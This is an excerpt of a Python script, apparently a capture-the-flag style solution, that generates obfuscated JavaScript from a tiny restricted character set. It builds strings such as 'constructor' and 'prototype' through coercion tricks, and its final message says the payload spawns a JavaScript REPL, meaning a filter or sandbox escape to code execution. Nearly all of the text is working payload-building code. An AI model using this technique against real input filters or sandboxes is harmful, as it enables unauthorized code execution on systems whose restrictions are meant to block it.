...
def conjure(s, atsub_trigger=True):
    if s in atsub_table:
        if not atsub_firsts[s] and atsub_trigger:
            atsub_firsts[s] = True
            print('atsub new', s)
            return f'({atsub_stmts[s]})'
        return atsub_table[s]
    total = []
    for c in s:
        assert c in subst_letters or (c in atsub_table and atsub_trigger), f"havent unlocked '{c}' yet"
        if c in atsub_table:
            if ((not atsub_firsts[c]) and atsub_trigger):
                print('atsub new', c)
                total.append(f'({atsub_stmts[c]})')
                atsub_firsts[c] = True
            else:
                total.append(atsub_table[c])
        else:
            total.append(subst_letters[c])
    return "+".join(total)


array_at = "[][((7==77)+[])[+(7==7)]+((7==7)+[])[7-7]]"
...
# []['at'] = "constructor"
atsub_stmts['constructor'] = f"{array_at}[7]={conjure('constructor')}"
atsub_firsts['constructor'] = False
atsub_table['constructor'] = f"{array_at}[7]"

subst_letters["m"] = f"((+[])[{conjure('constructor', False)}]+[])[+(7==7)+[]+ +(7==7)]"

atsub_stmts['p'] = f"{array_at}[77]=(7777)[{conjure('to')}+(7+[])[{conjure('constructor', False)}][{conjure('name')}]](7+7+7+7)[+(7==7)]"
atsub_firsts['p'] = False
atsub_table["p"] = f"{array_at}[77]"

atsub_stmts['prototype'] = f"{array_at}[[]]={conjure('prototype')}"
atsub_firsts['prototype'] = False
atsub_table['prototype'] = f"{array_at}[[]]"
...
print('\n\n\nPAYLOAD BELOW (it spawns js repl)\n\n\n')
